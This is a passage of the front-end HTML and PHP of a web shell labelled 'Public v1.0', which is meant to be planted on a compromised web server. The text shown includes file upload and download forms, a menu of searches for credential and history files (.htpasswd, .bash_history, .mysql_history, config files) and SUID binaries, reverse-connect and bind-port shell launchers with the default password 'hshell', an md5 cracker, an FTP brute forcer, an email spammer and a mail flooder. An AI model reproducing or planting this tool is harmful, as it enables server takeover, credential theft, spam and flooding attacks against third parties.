<input type=hidden name="type" value=4>
</td></tr>
<tr><td colspan=2>
<input type=text name="value" class='ta' size=72 value=<?php echo pwd();?>>
</td></tr>
</table></form>
</td></tr>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::Download::.</b>
</td><td align=right>
<input type=submit class='bt' value="Download">
<input type=hidden name="type" value=11>
</td></tr>
<tr><td colspan=2>
<input type=text name="value" class='ta' size=71 value=<?php echo pwd();?>>
</td></tr>
</table></form></td><td valign=top align=left width=50%>
<form enctype="multipart/form-data" action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::Upload::.</b>
</td><td align=right colspan=3>
<input type=submit class='bt' value="Upload">
<input type=hidden name="type" value=6>
</td></tr>
<tr><td colspan=2>
<font size=2 color=#888888>New name:</b>
<input type=text size=15 name="newname" class=ta>
</td><td width=4></td><td colspan=2>
<input type=file name="userfile" size=28>
</td></tr>
</table></form>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::Alias::.</b>
</td><td align=right>
<input type=submit class='bt' value="RUN">
<input type=hidden name="type" value=7>
</td></tr>
<tr><td colspan=2>
<select name='value' class='ta' width=200>
<option>find apahce config file</option>
<option>find access_log files</option>
<option>find error_log files</option>
<option>find suid files</option>
<option>find suid files in current dir</option>
<option>find sgid files</option>
<option>find sgid files in current dir</option>
<option>find config.inc.php files</option>
<option>find config.inc.php files in current dir</option>
<option>find config* files</option>
<option>find config* files in current dir</option>
<option>find all writable files</option>
<option>find all writable files in current dir</option>
<option>find all writable directories</option>
<option>find all writable directories in current dir</option>
<option>find all writable directories and files</option>
<option>find all writable directories and files in current dir</option>
<option>find all service.pwd files</option>
<option>find service.pwd files in current dir</option>
<option>find all .htpasswd files</option>
<option>find .htpasswd files in current dir</option>
<option>find all .bash_history files</option>
<option>find .bash_history files in current dir</option>
<option>find all .mysql_history files</option>
<option>find .mysql_history files in current dir</option>
<option>find all .fetchmailrc files</option>
<option>find .fetchmailrc files in current dir</option>
<option>list file attributes on a Linux second extended file system</option>
<option>show opened ports</option>
<option>---------------------------------------------------------------------------------------------------------</option>
</select>
</td></tr>
</table></form></td>
<script>
function base64Encode(str)
{
	var charBase64 = new Array(
		'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
		'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
		'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
		'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/'
	);

	var out = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	var len = str.length;

	do
	{
		chr1 = str.charCodeAt(i++);
		chr2 = str.charCodeAt(i++);
		chr3 = str.charCodeAt(i++);


		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 0x03) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 0x0F) << 2) | (chr3 >> 6);
		enc4 = chr3 & 0x3F;

		out += charBase64[enc1] + charBase64[enc2];

		if (isNaN(chr2))
  		{
			out += '==';
		}
  		else if (isNaN(chr3))
  		{
			out += charBase64[enc3] + '=';
		}
		else
		{
			out += charBase64[enc3] + charBase64[enc4];
		}
	}
	while (i < len);

	return out;
}


function base64Decode(str)
{
	var indexBase64 = new Array(
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,62, -1,-1,-1,63,
		52,53,54,55, 56,57,58,59, 60,61,-1,-1, -1,-1,-1,-1,
		-1, 0, 1, 2,  3, 4, 5, 6,  7, 8, 9,10, 11,12,13,14,
		15,16,17,18, 19,20,21,22, 23,24,25,-1, -1,-1,-1,-1,
		-1,26,27,28, 29,30,31,32, 33,34,35,36, 37,38,39,40,
		41,42,43,44, 45,46,47,48, 49,50,51,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1
	);

	var out = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;


	str = str.replace(/^[^a-zA-Z0-9\+\/\=]+|[^a-zA-Z0-9\+\/\=]+$/g,"")

	var len = str.length;

	do
	{
		enc1 = indexBase64[str.charCodeAt(i++)];
		enc2 = indexBase64[str.charCodeAt(i++)];
		enc3 = indexBase64[str.charCodeAt(i++)];
		enc4 = indexBase64[str.charCodeAt(i++)];

		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;

		out += String.fromCharCode(chr1);

		if (enc3 != -1)
		{
			out += String.fromCharCode(chr2);
		}
		if (enc4 != -1)
		{
			out += String.fromCharCode(chr3);
		}
	}
	while (i < len);

	if (i != len)
	{
		new Error(BASE64_BROKEN);
		return "";
	}

	return out;
}

</script>
<td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td width=1%>
<b>.::Base64_encode::.</b>
</td><td align=right width=6%>
<input type=button value="encode" class='bt' onclick='t.value=base64Encode(t.value)'>	
</td>
<form action method=POST><td width=1%>
<b>.::Base64_decode::.</b>
</td><td align=right width=6%>
<input type=button value="decode" class='bt' onclick='n.value=base64Decode(n.value)'>	
</td></tr>
<tr><td colspan=2>
<input type=text name='t' class='ta' size=34>
</td><td colspan=2>
<input type=text name='n' class='ta' size=34>
</td></tr>
</table></form>
</td></tr>
</td></tr>
</table>
</td></tr><tr></tr><tr><td>
<table cellpadding=0 cellspacing=0><tr><td>
<table class='td1' width=226>
<tr><td width=100% class='td2'>
<form action method=POST>
<table cellpadding=0 cellspacing=0 width=90% border=0><tr><td colspan=3>
<b>.::Back Connect::.</b></td></tr>
<tr><td width=100% height=10 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2><b>IP:</b></font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='ip' size=15 value=<?php echo $_SERVER['REMOTE_ADDR'];?>></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>port:</font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='port' size=10 value='5000'></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>Method:</font></td>
<td width=5%></td>
<td width=100% align=right>
<select class='ta' name='method'>
<option>Perl</option>
<option>C#</option>
<option>---------------------</option>
</select></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=100% align=right colspan=3>
<input type=hidden name='type' value='12'>
<input type=submit value='Connect' class='bt'></form>
<tr><td width=100% height=5 colspan=3></td></tr>
</table>
</td></tr>
</table>
</td><td width=5></td><td>
<table class='td1' width=226>
<tr><td width=100% class='td2'>
<form action method=POST>
<table cellpadding=0 cellspacing=0 width=90% border=0><tr><td colspan=3>
<b>.::Bind port::.</b></td></tr>
<tr><td width=100% height=10 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2><b>Port:</b></font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='port' size=15 value='6000'></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>pass:</font></td>
<td width=5%></td>
<td width=100% align=right>
<input type=text class='ta' name='pass' size=10 value='hshell'></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=25% align=right><font color=#888888 size=2>Method:</font></td>
<td width=5%></td>
<td width=100% align=right>
<select class='ta' name='method'>
<option>Perl</option>
<option>C#</option>
<option>---------------------</option>
</select></td></tr>
<tr><td width=100% height=5 colspan=3></td></tr>
<tr><td width=100% align=right colspan=3>
<input type=hidden name='type' value='12'>
<input type=submit value='Bind' class='bt'></form>
<tr><td width=100% height=5 colspan=3></td></tr>
</table>
</td></tr>
</table>
</td><td width=5></td><td width=50% height=141>
<table class='td1' width=100% height=100% valign=top><tr><td width=100% height=100% class='td2' valign=top>
<table cellpadding=0 cellspacing=0 width=95%><tr><td colspan=4>
<b>.::md5 bruter::.</b>
</td></tr><tr><td height=10></td></tr>
<tr><td width=20></td><td>
<font size=2 color="#888888" align=right><b>hash:</b></font></td><td width=5></td><td align=right>
<input type=text name='hash' class='ta' size=50>
</td></tr>
<tr><td height=5></td>
<tr><td width=20></td><td>
<font size=2 color="#888888" align=right>log_file:</font></td><td width=5></td><td align=right>
<input type=text name='log' class='ta' size=30 value='md5_log.txt'>
</td></tr>
<tr><td height=5></td>
<tr><td width=20></td><td>
<font size=2 color="#888888" align=right>dictionary_file:</font></td><td width=5></td><td align=right>
<input type=text name='dict' class='ta' size=30 value='md5_dict.txt'>
</td></tr>
<tr><td height=5></td>
<tr><td width=20></td><td>
</td><td width=5></td><td align=right>
<input type=submit class='bt' value='Start Brute'>
</td></tr>
</table>
</td></tr></table>
</td></tr></table>
<tr></tr><tr><td>
<table class='td1' width=100% height=310 valign=top align=left>
<form action method=POST>
<td valign=top align=left class='td2' width=33%>
<table cellpadding=0 cellspacing=0 width=100%>
<tr><td valign=top colspan=3 height=30>
<b>.::Spammer::.</b>
<tr><td width=25% align=right>
<font color=#888888 size=2><b>emails_file:</b></font>
</td><td width=65% align=right>
<input type=text name='elist' class='ta' size=17 value="emails.txt">
</td></tr><tr><td height=5></td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2><b>log_file:</b></font>
</td><td width=65% align=right>
<input type=text name='log' class='ta' size=17 value="mail_log.txt">
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>From:</font>
</td><td width=65% align=right>
<input type=text name='from' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Subject:</font>
</td><td width=65% align=right>
<input type=text name='subject' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Message:</font>
</td><td width=65% align=right>
<textarea name='msg' class='ta' cols=20 rows=4></textarea>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Check<sup>*</sup>:</font>
</td><td width=65% align=right>
<input type=text name='check' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
</td><td width=65% align=right>
<input type=submit class='bt' value="Start">
<input type=hidden name='type' value=10>
</td></tr>
</table></form>
<form action method=POST>
<td valign=top align=left class='td2' width=33%>
<table cellpadding=0 cellspacing=0 width=100%>
<tr><td colspan=3 height=30 valign=top><b>.::FTP-Brute::.</b></td></tr>
<tr><td width=31% align=right>
<font color=#888888 size=2><b>Host:</b></font>
</td><td align=right>
<input type=text name='host' class='ta' size=28>
</td><td width=5%></td></tr><tr><td height=35 width=100% colspan=2></td></tr>
<tr><td align=right>
<font color=#888888 size=2>ftp_users file:</font>
</td><td align=right>
<input type=text name='users' class='ta' size=17 value="ftp_users.txt">
</td><td></td></tr>
<tr><td height=5 width=100% colspan=2></td></tr>
<tr><td align=right>
<font color=#888888 size=2>ftp_passwd file:</font>
</td><td align=right>
<input type=text name='passwd' class='ta' size=17 value="ftp_passwds.txt">
</td><td></td></tr>
<tr><td height=5 width=100% colspan=2></td></tr>
<tr><td align=right>
<font color=#888888 size=2>ftp_log file:</font>
</td><td align=right>
<input type=text name='log' class='ta' size=17 value="ftp_log.txt">
</td><td></td></tr>
<tr><td colspan=2 height=20></td></tr>
<tr><td colspan=2 align=right>
<input type=submit class='bt' value="Start Brute">
<input type=hidden name="type" value=9>
</td></tr>
</td></table></form>
<form action method=POST>
<td valign=top align=left class='td2' width=33%>
<table cellpadding=0 cellspacing=0 width=100%>
<tr><td valign=top colspan=3 height=30>
<b>.::Flooder::.</b>
<tr><td width=25% align=right>
<font color=#888888 size=2><b>log_file:</b></font>
</td><td width=65% align=right>
<input type=text name='log' class='ta' size=17 value="mflood_log.txt">
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Send to:</font>
</td><td width=65% align=right>
<input type=text name='to' class='ta' size=27>
</td></tr><tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>From:</font>
</td><td width=65% align=right>
<input type=text name='from' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Subject:</font>
</td><td width=65% align=right>
<input type=text name='subject' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Message:</font>
</td><td width=65% align=right>
<textarea name='msg' class='ta' cols=20 rows=4></textarea>
</td></tr>
<td height=25><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Amount:</font>
</td><td width=65% align=right>
<input type=text name='amount' class='ta' size=17>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
<font color=#888888 size=2>Check<sup>*</sup>:</font>
</td><td width=65% align=right>
<input type=text name='check' class='ta' size=27>
</td></tr>
<td height=5><td></tr>
<tr><td width=25% align=right>
</td><td width=65% align=right>
<input type=submit class='bt' value="Flood">
<input type=hidden name='type' value=10>
</td></tr>
</table></form>
</td></tr>
</table>
</td></tr>
</table>
</td></tr>
</table></center>
<center><font size=1 color=#444444>.:[Public v1.0]:.</font></center>
</body>
</html>
	
<!-- Coded by LoFFi & Ls01r //-->